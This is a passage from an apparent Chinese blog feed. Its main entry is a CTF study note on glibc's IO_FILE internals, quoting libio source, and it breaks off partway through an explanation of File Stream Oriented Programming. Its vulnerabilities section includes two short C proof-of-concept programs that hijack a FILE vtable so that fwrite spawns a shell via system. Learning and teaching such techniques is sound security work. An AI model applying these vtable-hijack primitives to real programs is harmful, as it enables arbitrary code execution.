rel="noopener">https://www.linuxidc.com/Linux/2015-02/112914.htm</a><br><a href="https://atum.li/2017/04/25/linuxsandbox" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox</a><br><a href="https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IO_FILE in CTF</title>
    <link href="/2020/04/19/IO-FILE-in-CTF/"/>
    <url>/2020/04/19/IO-FILE-in-CTF/</url>
    
    <content type="html"><![CDATA[<p>记录 IO_FILE 相关知识。</p><a id="more"></a><h1 id="FILE-Structure"><a href="#FILE-Structure" class="headerlink" title="FILE Structure"></a>FILE Structure</h1><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 <code>fopen</code> 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 相关的结构定义在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中：</p><pre><code class="cpp">struct _IO_FILE {  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;    /* Current read pointer */  char* _IO_read_end;    /* End of get area. */  char* _IO_read_base;    /* Start of putback+get area. */  char* _IO_write_base;    /* Start of put area. */  char* _IO_write_ptr;    /* Current put pointer. */  char* _IO_write_end;    /* End of put area. */  char* _IO_buf_base;    /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};</code></pre><p>进程中的 FILE 结构会通过 <code>_chain</code> 域彼此连接形成一个链表，链表头部用全局变量 <code>_IO_list_all</code> 表示，通过这个值可以遍历所有的 FILE 结构。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，<code>_IO_list_all</code> 指向了一个有这些文件流构成的链表，这三个文件流位于 libc.so 的数据段；而使用 <code>fopen</code> 创建的文件流是分配在堆内存上的。</p><pre><code class="bash">$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep -E &quot;stdin|stdout|stderr&quot;stderr_IO_2_1_stderr__IO_2_1_stdout_stdout_IO_2_1_stdin_stdinstdinstdoutstderrrcmd: write (setting up stderr): %mrcmd: poll (setting up stderr): %m</code></pre><p>而在 <code>_IO_FILE</code> 结构体外还有一层结构体叫做 <code>_IO_FILE_plus</code>（<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html" target="_blank" rel="noopener">glibc/libio/libioP.h</a>），其中包含了一个指针 <code>vtable</code>，其指向了一系列函数（在 libc-2.23 下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8）：</p><pre><code class="cpp">/* We always allocate an extra word following an _IO_FILE.   This contains a pointer to the function jump table used.   This is for compatibility with C++ streambuf; the word can   be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus{  _IO_FILE file;  const struct _IO_jump_t *vtable;};</code></pre><p>其中 <code>vtable</code> 是 <code>_IO_jump_t</code> 结构体，用于保存函数指针：</p><pre><code class="cpp">#define JUMP_FIELD(TYPE, NAME) TYPE NAME...struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);#if 0    get_column;    set_column;#endif};</code></pre><p>在 <a href="https://code.woboq.org/userspace/glibc/libio/fileops.c.html" target="_blank" rel="noopener">glibc/libio/fileops.c</a> 中可以看到一般情况下 vtable 表默认指向的各个函数：</p><pre><code class="cpp">const struct _IO_jump_t _IO_file_jumps ={  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_file_finish),  JUMP_INIT(overflow, _IO_file_overflow),  JUMP_INIT(underflow, _IO_file_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_default_pbackfail),  JUMP_INIT(xsputn, _IO_file_xsputn),  JUMP_INIT(xsgetn, _IO_file_xsgetn),  JUMP_INIT(seekoff, _IO_new_file_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_new_file_setbuf),  JUMP_INIT(sync, _IO_new_file_sync),  JUMP_INIT(doallocate, _IO_file_doallocate),  JUMP_INIT(read, _IO_file_read),  JUMP_INIT(write, _IO_new_file_write),  JUMP_INIT(seek, _IO_file_seek),  JUMP_INIT(close, _IO_file_close),  JUMP_INIT(stat, _IO_file_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)};</code></pre><h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a><code>fread()</code></h2><p><code>fread()</code> 是标准 IO 库函数，作用是从文件流中读数据，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofread.c.html" target="_blank" rel="noopener">glibc/libio/iofread.c</a> 中实现，实际函数名为 <code>_IO_fread</code>。其中 buf 为存放数据的缓冲区，size 指定一个数据项对应的字节数，count 指定读入数据的个数，fp 为目标文件流。一开始的 <code>CHECK_FILE</code> 就是检查一个 Magic Number，真正的读功能在 <code>_IO_sgetn</code> 中实现：</p><pre><code class="cpp">_IO_size_t_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp){  _IO_size_t bytes_requested = size * count;  _IO_size_t bytes_read;  CHECK_FILE (fp, 0);  if (bytes_requested == 0)    return 0;  _IO_acquire_lock (fp);  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);  _IO_release_lock (fp);  return bytes_requested == bytes_read ? count : bytes_read / size;}</code></pre><p><code>_IO_sgetn</code> 则在 <a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html" target="_blank" rel="noopener">glibc/libio/genops.c</a> 中实现，其中调用了 <code>_IO_XSGETN</code>：</p><pre><code class="cpp">_IO_size_t_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n){  /* FIXME handle putback buffer here! */  return _IO_XSGETN (fp, data, n);}</code></pre><p>而 <code>_IO_XSGETN</code> 在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中实现。把宏一个一个展开来大概可以看出用于获取 vtable 对应的函数 <code>__xsgetn</code>：</p><pre><code class="cpp">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)...#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)...#if _IO_JUMPS_OFFSET# define _IO_JUMPS_FUNC(THIS) \ (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \               + (THIS)-&gt;_vtable_offset))# define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset#else# define _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)# define _IO_vtable_offset(THIS) 0#endif...#define _IO_JUMPS_FILE_plus(THIS) \  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable).../* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing   violation in case THIS has a different pointer type.  */#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \                       + offsetof(TYPE, MEMBER))).../* Type of MEMBER in struct type TYPE.  */#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)</code></pre><p>而默认情况下这个指针是指向 <code>_IO_file_xsgetn</code> 的：</p><pre><code class="cpp">_IO_size_t_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n){  _IO_size_t want, have;  _IO_ssize_t count;  char *s = data;  want = n;  if (fp-&gt;_IO_buf_base == NULL)    {      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_IO_save_base != NULL)    {      free (fp-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    }      _IO_doallocbuf (fp);    }  while (want &gt; 0)    {      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;      if (want &lt;= have)    {      memcpy (s, fp-&gt;_IO_read_ptr, want);      fp-&gt;_IO_read_ptr += want;      want = 0;    }      else    {      if (have &gt; 0)        {#ifdef _LIBC          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);#else          memcpy (s, fp-&gt;_IO_read_ptr, have);          s += have;#endif          want -= have;          fp-&gt;_IO_read_ptr += have;        }      /* Check for backup and repeat */      if (_IO_in_backup (fp))        {          _IO_switch_to_main_get_area (fp);          continue;        }      /* If we now want less than a buffer, underflow and repeat         the copy.  Otherwise, _IO_SYSREAD directly to         the user buffer. */      if (fp-&gt;_IO_buf_base          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))        {          if (__underflow (fp) == EOF)        break;          continue;        }      /* These must be set before the sysread as we might longjmp out         waiting for input. */      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);      /* Try to maintain alignment: read a whole number of blocks.  */      count = want;      if (fp-&gt;_IO_buf_base)        {          _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;          if (block_size &gt;= 128)        count -= want % block_size;        }      count = _IO_SYSREAD (fp, s, count);      if (count &lt;= 0)        {          if (count == 0)        fp-&gt;_flags |= _IO_EOF_SEEN;          else        fp-&gt;_flags |= _IO_ERR_SEEN;          break;        }      s += count;      want -= count;      if (fp-&gt;_offset != _IO_pos_BAD)        _IO_pos_adjust (fp-&gt;_offset, count);    }    }  return n - want;}</code></pre><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a><code>fwrite()</code></h2><p><code>fwrite</code> 同样是标准 IO 库函数，作用是向文件流写入数据，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofwrite.c.html" target="_blank" rel="noopener">glibc/libio/iofwrite.c</a> 中实现。其中 buf 为一个写入数据的缓冲区，size 为写入的一个数据项对应的字节数，count 为写入的数据总数，stream 为目标文件流：</p><pre><code class="cpp">_IO_size_t_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp){  _IO_size_t request = size * count;  _IO_size_t written = 0;  CHECK_FILE (fp, 0);  if (request == 0)    return 0;  _IO_acquire_lock (fp);  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)    written = _IO_sputn (fp, (const char *) buf, request);  _IO_release_lock (fp);  /* We have written all of the input in case the return value indicates     this or EOF is returned.  The latter is a special case where we     simply did not manage to flush the buffer.  But the data is in the     buffer and therefore written as far as fwrite is concerned.  */  if (written == request || written == EOF)    return count;  else    return written / size;}</code></pre><p>主要功能在 <code>_IO_sputn</code> 中：</p><pre><code class="cpp">#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</code></pre><p>和前面的 <code>fread</code> 同理，<code>fwrite</code> 最终获取到 vtable 对应的 <code>__xsputn</code> 成员所指向的函数 <code>_IO_file_xsputn</code>（<code>_IO_new_file_xsputn</code>），最终会调用系统接口 <code>write</code> 函数：</p><pre><code class="cpp"># define _IO_new_file_xsputn _IO_file_xsputn..._IO_size_t_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n){  const char *s = (const char *) data;  _IO_size_t to_do = n;  int must_flush = 0;  _IO_size_t count = 0;  if (n &lt;= 0)    return 0;  /* This is an optimized implementation.     If the amount to be written straddles a block boundary     (or the filebuf is unbuffered), use sys_write directly. */  /* First figure out how much space is available in the buffer. */  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    {      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;      if (count &gt;= n)    {      const char *p;      for (p = s + n; p &gt; s; )        {          if (*--p == &#39;\n&#39;)        {          count = p - s + 1;          must_flush = 1;          break;        }        }    }    }  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */  /* Then fill the buffer. */  if (count &gt; 0)    {      if (count &gt; to_do)    count = to_do;#ifdef _LIBC      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);#else      memcpy (f-&gt;_IO_write_ptr, s, count);      f-&gt;_IO_write_ptr += count;#endif      s += count;      to_do -= count;    }  if (to_do + must_flush &gt; 0)    {      _IO_size_t block_size, do_write;      /* Next flush the (full) buffer. */      if (_IO_OVERFLOW (f, EOF) == EOF)    /* If nothing else has to be written we must not signal the       caller that everything has been written.  */    return to_do == 0 ? EOF : n - to_do;      /* Try to maintain alignment: write a whole number of blocks.  */      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;      do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);      if (do_write)    {      count = new_do_write (f, s, do_write);      to_do -= count;      if (count &lt; do_write)        return n - to_do;    }      /* Now write out the remainder.  Normally, this will fit in the     buffer, but it&#39;s somewhat messier for line-buffered files,     so we let _IO_default_xsputn handle the general case. */      if (to_do)    to_do -= _IO_default_xsputn (f, s+do_write, to_do);    }  return n - to_do;}</code></pre><p><code>printf</code> 和 <code>puts</code> 是常用的输出函数，在 <code>printf</code> 的参数是以 <code>&#39;\n&#39;</code> 结束的纯字符串时，<code>printf</code> 会被优化为 <code>puts</code> 函数并去除换行符。<code>puts</code> 在源码中实现的函数是 <code>_IO_puts</code>，这个函数的操作与 <code>fwrite</code> 的流程大致相同，函数内部同样会调用 vtable 中的 <code>_IO_sputn</code>，结果会执行 <code>_IO_new_file_xsputn</code>，最后会调用到系统接口 write 函数。而 <code>printf</code> 的调用栈回溯如下，同样是通过 <code>_IO_file_xsputn</code>（<code>_IO_new_file_xsputn</code>）实现：</p><pre><code>vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite</code></pre><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a><code>fopen()</code></h2><p><code>fopen</code> 是一个在 <a href="https://code.woboq.org/userspace/glibc/libio/stdio.h.html" target="_blank" rel="noopener">glibc/include/stdio.h</a> 中实现的宏，在标准 IO 库中用于打开文件。其中 fname 指定文件路径，mode 指定打开方式的类型：</p><pre><code class="cpp">#   define fopen(fname, mode) _IO_new_fopen (fname, mode)</code></pre><p>对应的 <code>_IO_new_fopen</code> 在 <a href="https://code.woboq.org/userspace/glibc/libio/iofopen.c.html" target="_blank" rel="noopener">glibc/libio/iofopen.c</a> 中实现，其中主要调用了 <code>__fopen_internal</code> 函数：</p><pre><code class="cpp">_IO_FILE *_IO_new_fopen (const char *filename, const char *mode){  return __fopen_internal (filename, mode, 1);}</code></pre><p><code>__fopen_internal</code> 内部会调用 <code>malloc</code> 函数，分配 FILE 结构的空间，因此可以获知 FILE 结构是存储在堆上的。之后会为创建的 FILE 初始化 vtable，并调用 <code>_IO_file_init</code> 进一步初始化操作。之后调用 <code>_IO_file_fopen</code> 函数打开目标文件并根据用户传入的打开模式进行打开操作，最后会调用到系统接口 <code>open</code> 函数：</p><pre><code class="cpp">_IO_FILE *__fopen_internal (const char *filename, const char *mode, int is32){  struct locked_FILE  {    struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO    _IO_lock_t lock;#endif    struct _IO_wide_data wd;  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  if (new_f == NULL)    return NULL;#ifdef _IO_MTSAFE_IO  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;#endif#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);#else  _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);#endif  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;  _IO_file_init (&amp;new_f-&gt;fp);#if  !_IO_UNIFIED_JUMPTABLES  new_f-&gt;fp.vtable = NULL;#endif  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);  _IO_un_link (&amp;new_f-&gt;fp);  free (new_f);  return NULL;}</code></pre><p>在 <code>_IO_file_init</code> 函数的初始化操作中，会调用 <code>_IO_link_in</code> 把新分配的 FILE 链入 <code>_IO_list_all</code> 为起始的 FILE 链表中：</p><pre><code class="cpp"># define _IO_new_file_init _IO_file_init...void_IO_new_file_init (struct _IO_FILE_plus *fp){  /* POSIX.1 allows another file handle to be used to change the position     of our file descriptor.  Hence we actually don&#39;t know the actual     position before we do the first fseek (and until a following fflush). */  fp-&gt;file._offset = _IO_pos_BAD;  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;  _IO_link_in (fp);  fp-&gt;file._fileno = -1;}..._IO_link_in (struct _IO_FILE_plus *fp){  if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)    {      fp-&gt;file._flags |= _IO_LINKED;#ifdef _IO_MTSAFE_IO      _IO_cleanup_region_start_noarg (flush_cleanup);      _IO_lock_lock (list_all_lock);      run_fp = (_IO_FILE *) fp;      _IO_flockfile ((_IO_FILE *) fp);#endif      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;      _IO_list_all = fp;      ++_IO_list_all_stamp;#ifdef _IO_MTSAFE_IO      _IO_funlockfile ((_IO_FILE *) fp);      run_fp = NULL;      _IO_lock_unlock (list_all_lock);      _IO_cleanup_region_end (0);#endif    }}</code></pre><p>最终可以得出 fopen 的操作如下：</p><ul><li>使用 <code>malloc</code> 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a><code>fclose()</code></h2><p><code>fclose</code> 是标准 IO 库中用于关闭已打开文件的函数，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofclose.c.html" target="_blank" rel="noopener">glibc/include/iofclose.c</a>，宏定义如下。其中 fp 为已经打开的文件流：</p><pre><code class="cpp">#   define fclose(fp) _IO_new_fclose (fp)</code></pre><p><code>fclose</code> 首先会调用 <code>_IO_un_link</code> 将指定的 FILE 从 <code>_chain</code> 链表中脱链。之后会调用 <code>_IO_file_close_it</code> 函数，<code>_IO_file_close_it</code> 会调用系统接口 <code>close</code> 关闭文件。最后调用 vtable 中的 <code>_IO_FINISH</code>，其对应的是 <code>_IO_file_finish</code> 函数，其中会调用 <code>free</code> 函数释放之前分配的 FILE 结构：</p><pre><code class="cpp">int_IO_new_fclose (_IO_FILE *fp){  int status;  CHECK_FILE(fp, EOF);#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)  /* We desperately try to help programs which are using streams in a     strange way and mix old and new functions.  Detect old streams     here.  */  if (_IO_vtable_offset (fp) != 0)    return _IO_old_fclose (fp);#endif  /* First unlink the stream.  */  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)    _IO_un_link ((struct _IO_FILE_plus *) fp);  _IO_acquire_lock (fp);  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)    status = _IO_file_close_it (fp);  else    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;  _IO_release_lock (fp);  _IO_FINISH (fp);  if (fp-&gt;_mode &gt; 0)    {#if _LIBC      /* This stream has a wide orientation.  This means we have to free     the conversion functions.  */      struct _IO_codecvt *cc = fp-&gt;_codecvt;      __libc_lock_lock (__gconv_lock);      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);      __libc_lock_unlock (__gconv_lock);#endif    }  else    {      if (_IO_have_backup (fp))    _IO_free_backup_area (fp);    }  if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)    {      fp-&gt;_IO_file_flags = 0;      free(fp);    }  return status;}...void_IO_un_link (struct _IO_FILE_plus *fp){  if (fp-&gt;file._flags &amp; _IO_LINKED)    {      struct _IO_FILE **f;#ifdef _IO_MTSAFE_IO      _IO_cleanup_region_start_noarg (flush_cleanup);      _IO_lock_lock (list_all_lock);      run_fp = (_IO_FILE *) fp;      _IO_flockfile ((_IO_FILE *) fp);#endif      if (_IO_list_all == NULL)    ;      else if (fp == _IO_list_all)    {      _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;      ++_IO_list_all_stamp;    }      else    for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)      if (*f == (_IO_FILE *) fp)        {          *f = fp-&gt;file._chain;          ++_IO_list_all_stamp;          break;        }      fp-&gt;file._flags &amp;= ~_IO_LINKED;#ifdef _IO_MTSAFE_IO      _IO_funlockfile ((_IO_FILE *) fp);      run_fp = NULL;      _IO_lock_unlock (list_all_lock);      _IO_cleanup_region_end (0);#endif    }}...# define _IO_new_file_close_it _IO_file_close_it...int_IO_new_file_close_it (_IO_FILE *fp){  int write_status;  if (!_IO_file_is_open (fp))    return EOF;  if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0)    write_status = _IO_do_flush (fp);  else    write_status = 0;  _IO_unsave_markers (fp);  int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0              ? _IO_SYSCLOSE (fp) : 0);  /* Free buffer. */#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  if (fp-&gt;_mode &gt; 0)    {      if (_IO_have_wbackup (fp))    _IO_free_wbackup_area (fp);      _IO_wsetb (fp, NULL, NULL, 0);      _IO_wsetg (fp, NULL, NULL, NULL);      _IO_wsetp (fp, NULL, NULL);    }#endif  _IO_setb (fp, NULL, NULL, 0);  _IO_setg (fp, NULL, NULL, NULL);  _IO_setp (fp, NULL, NULL);  _IO_un_link ((struct _IO_FILE_plus *) fp);  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;  fp-&gt;_fileno = -1;  fp-&gt;_offset = _IO_pos_BAD;  return close_status ? close_status : write_status;}...#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)...# define _IO_new_file_finish _IO_file_finish...void_IO_new_file_finish (_IO_FILE *fp, int dummy){  if (_IO_file_is_open (fp))    {      _IO_do_flush (fp);      if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))    _IO_SYSCLOSE (fp);    }  _IO_default_finish (fp, 0);}</code></pre><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Forge-Vtable-to-Control-PC"><a href="#Forge-Vtable-to-Control-PC" class="headerlink" title="Forge Vtable to Control PC"></a>Forge Vtable to Control PC</h2><p>伪造 vtable 劫持程序流程的中心思想就是针对 <code>_IO_FILE_plus</code> 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。直接修改 vtable 的方法测试了一下在 glibc-2.19 也不能成功，测试程序的 vtable 正好落在 libc 的数据段上，是只读的：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define system_ptr 0x00007ffff7a0d000+0x45390int main() {    FILE *fp;    uint64_t *vtable_ptr;    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    vtable_ptr = *(uint64_t *)((uint64_t)fp + 0xd8);    memcpy(fp, &quot;sh&quot;, 3);    vtable_ptr[7] = system_ptr; // __xsputn    fwrite(&quot;X&quot;, 1, 1, fp);    return 0;}</code></pre><p>在可控区域伪造一个 vtable 来替换原来的 vtable 是可行的：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define system_ptr 0x00007ffff7a0d000+0x45390int main() {    FILE *fp;    uint64_t *vtable_addr, *fake_vtable;    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    fake_vtable = malloc(0x40);    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);    vtable_addr[0] = (uint64_t)fake_vtable;    memcpy(fp, &quot;sh&quot;, 3);    fake_vtable[7] = system_ptr; // __xsputn    fwrite(&quot;X&quot;, 1, 1, fp);    return 0;}</code></pre><h2 id="File-Stream-Oriented-Programming（FSOP）"><a href="#File-Stream-Oriented-Programming（FSOP）" class="headerlink" title="File Stream Oriented Programming（FSOP）"></a>File Stream Oriented Programming（FSOP）</h2><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的 <code>_IO_FILE</code> 结构会使用 <code>_chain</code> 域相互连接形成一个链表，这个链表的头部由 <code>_IO_list_all</code> 维护。FSOP 的核心思想就是劫持 <code>_IO_list_all</code> 的值来伪造链表和其中的 <code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 <code>_IO_flush_all_lockp</code>，这个函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code>。</p><pre><code class="cpp">int_IO_flush_all_lockp (int do_lock){  int result = 0;  struct _IO_FILE *fp;  int last_stamp;#ifdef _IO_MTSAFE_IO  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);  if (do_lock)    _IO_lock_lock (list_all_lock);#endif  last_stamp = _IO_list_all_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    {      run_fp = fp;      if (do_lock)    _IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;      if (do_lock)    _IO_funlockfile (fp);      run_fp = NULL;      if (last_stamp != _IO_list_all_stamp)    {      /* Something was added to the list.  Start all over again.  */      fp = (_IO_FILE *) _IO_list_all;      last_stamp = _IO_list_all_stamp;    }      else    fp = fp-&gt;_chain;    }#ifdef _IO_MTSAFE_IO  if (do_lock)    _IO_lock_unlock (list_all_lock);  __libc_cleanup_region_end (0);#endif  return result;}</code></pre><p><code>_IO_flush_all_lockp</code> 函数不需要手动调用，在一些情况下这个函数会被系统调用：</p><ul><li>当 libc 执行 abort 流程时</li><li>当执行 <code>exit</code> 函数时</li><li>当执行流从 <code>main</code> 函数返回时</li></ul><p><code>_IO_list_all</code> 作为 libc 中的全局变量，需要获取 libc 基址才能得到 <code>_IO_list_all</code> 的地址。要实现 FSOP，还需要使构造的 FILE 能够正常工作，也就是需要 <code>fp-&gt;_mode</code> 的值为 0，<code>fp-&gt;_IO_write_ptr</code> 要大于 <code>fp-&gt;_IO_write_base</code>：</p><pre><code class="cpp">if 